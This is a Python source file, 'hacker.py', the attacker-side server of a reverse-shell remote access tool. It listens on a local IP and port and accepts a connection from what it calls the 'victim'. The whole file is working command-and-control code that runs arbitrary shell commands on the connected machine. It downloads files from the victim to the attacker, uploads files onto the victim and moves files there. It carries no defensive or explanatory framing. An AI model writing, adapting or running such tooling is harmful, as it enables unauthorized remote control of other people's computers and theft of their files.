# hacker.py
import socket
import os
import shlex

IP = "192.168.1.7"
PORT = 8008
IDENTIFIER = "<END_OF_COMMAND_RESULT>"
BUFFER_SIZE = 4096

def validate_command(command):
    if not command.strip():
        return False, "Empty command"
    return True, ""

def send_file(client_socket, file_path, dest_path):
    try:
        if not os.path.isfile(file_path):
            print(f"[-] File not found: {file_path}")
            return False

        file_size = os.path.getsize(file_path)
        # Send command, filename, destination path, and file size
        client_socket.sendall(f"upload {os.path.basename(file_path)} {dest_path} {file_size}".encode())
        
        # Wait for ready signal
        ready = client_socket.recv(16).decode().strip()
        if ready != "READY":
            print("[-] Victim not ready to receive file")
            return False

        with open(file_path, "rb") as f:
            bytes_sent = 0
            while bytes_sent < file_size:
                chunk = f.read(BUFFER_SIZE)
                if not chunk:
                    break
                client_socket.sendall(chunk)
                bytes_sent += len(chunk)
        
        print(f"[+] File sent successfully: {file_path} -> {dest_path}")
        return True
    except Exception as e:
        print(f"[-] Error sending file: {e}")
        return False

def start_hacker_server():
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        hacker_socket.bind((IP, PORT))
        hacker_socket.listen(1)
        print(f"[+] Listening on {IP}:{PORT}...")

        client_socket, client_address = hacker_socket.accept()
        print(f"[+] Connection from {client_address}")
        client_socket.settimeout(None)

        try:
            while True:
                command = input("Enter command: ").strip()
                is_valid, msg = validate_command(command)
                if not is_valid:
                    print(f"[-] {msg}")
                    continue

                # Handle download command (hacker downloads from victim)
                if command.lower().startswith("download "):
                    try:
                        parts = shlex.split(command)
                        print(f"[DEBUG] Parsed command: {parts}")
                        if len(parts) != 3:
                            print("[-] Usage: download <victim_path> <hacker_save_path>")
                            continue

                        victim_file = parts[1]
                        save_path = parts[2]

                        client_socket.sendall(command.encode())

                        # Receive file size header
                        header = client_socket.recv(BUFFER_SIZE).decode(errors='ignore')
                        if header.startswith("ERROR:"):
                            print(header)
                            continue

                        print(f"[DEBUG] File size received: {header}")
                        file_size = int(header.strip())
                        client_socket.sendall(b"READY")

                        received = 0
                        data = b""
                        while received < file_size:
                            chunk = client_socket.recv(min(BUFFER_SIZE, file_size - received))
                            if not chunk:
                                break
                            data += chunk
                            received += len(chunk)

                        try:
                            abs_save_path = os.path.abspath(save_path)
                            save_dir = os.path.dirname(abs_save_path)

                            print(f"[DEBUG] Normalized save path: {abs_save_path}")
                            print(f"[DEBUG] Target save directory: {save_dir}")

                            os.makedirs(save_dir, exist_ok=True)

                            with open(abs_save_path, "wb") as f:
                                f.write(data)

                            print(f"[+] File saved to: {abs_save_path}")
                            print(f"[DEBUG] File exists after save: {os.path.exists(abs_save_path)}")
                        except Exception as e:
                            print(f"[-] Error writing file: {e}")

                    except Exception as e:
                        print(f"[-] Failed to receive file: {e}")
                    continue

                # Handle upload command (hacker uploads to victim)
                if command.lower().startswith("upload "):
                    parts = shlex.split(command)
                    if len(parts) != 3:
                        print("[-] Usage: upload <local_file_path> <destination_path>")
                        print("[-] Example: upload /home/user/file.txt /tmp/")
                        continue
                    
                    file_path = parts[1]
                    dest_path = parts[2]
                    if not os.path.isfile(file_path):
                        print(f"[-] File not found: {file_path}")
                        continue
                    
                    if send_file(client_socket, file_path, dest_path):
                        # Get confirmation from victim
                        confirmation = client_socket.recv(BUFFER_SIZE).decode(errors='ignore')
                        print(confirmation)
                    continue

                # Handle move command
                if command.lower().startswith("mv "):
                    parts = shlex.split(command)
                    if len(parts) != 3:
                        print("[-] Usage: mv <source_path> <destination_path>")
                        print("[-] Example: mv /home/user/file.txt /tmp/newfile.txt")
                        continue
                    
                    client_socket.sendall(command.encode())
                    
                    # Receive move result
                    full_result = b""
                    while True:
                        chunk = client_socket.recv(BUFFER_SIZE)
                        if not chunk:
                            break
                        full_result += chunk
                        if IDENTIFIER.encode() in full_result:
                            full_result = full_result.split(IDENTIFIER.encode())[0]
                            break

                    print(full_result.decode(errors='ignore') if full_result else "[-] No response received")
                    continue

                # Send regular command
                client_socket.sendall(command.encode())

                if command.lower() == "stop":
                    print("[+] Stopping both hacker and victim...")
                    break

                # Receive command result
                full_result = b""
                while True:
                    chunk = client_socket.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    full_result += chunk
                    if IDENTIFIER.encode() in full_result:
                        full_result = full_result.split(IDENTIFIER.encode())[0]
                        break

                print(full_result.decode(errors='ignore') if full_result else "[-] No response received")

        except Exception as e:
            print(f"[-] Runtime error: {e}")
        finally:
            client_socket.close()
            print("[-] Client disconnected")

    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        hacker_socket.close()
        print("[-] Server shut down")

if __name__ == "__main__":
    start_hacker_server()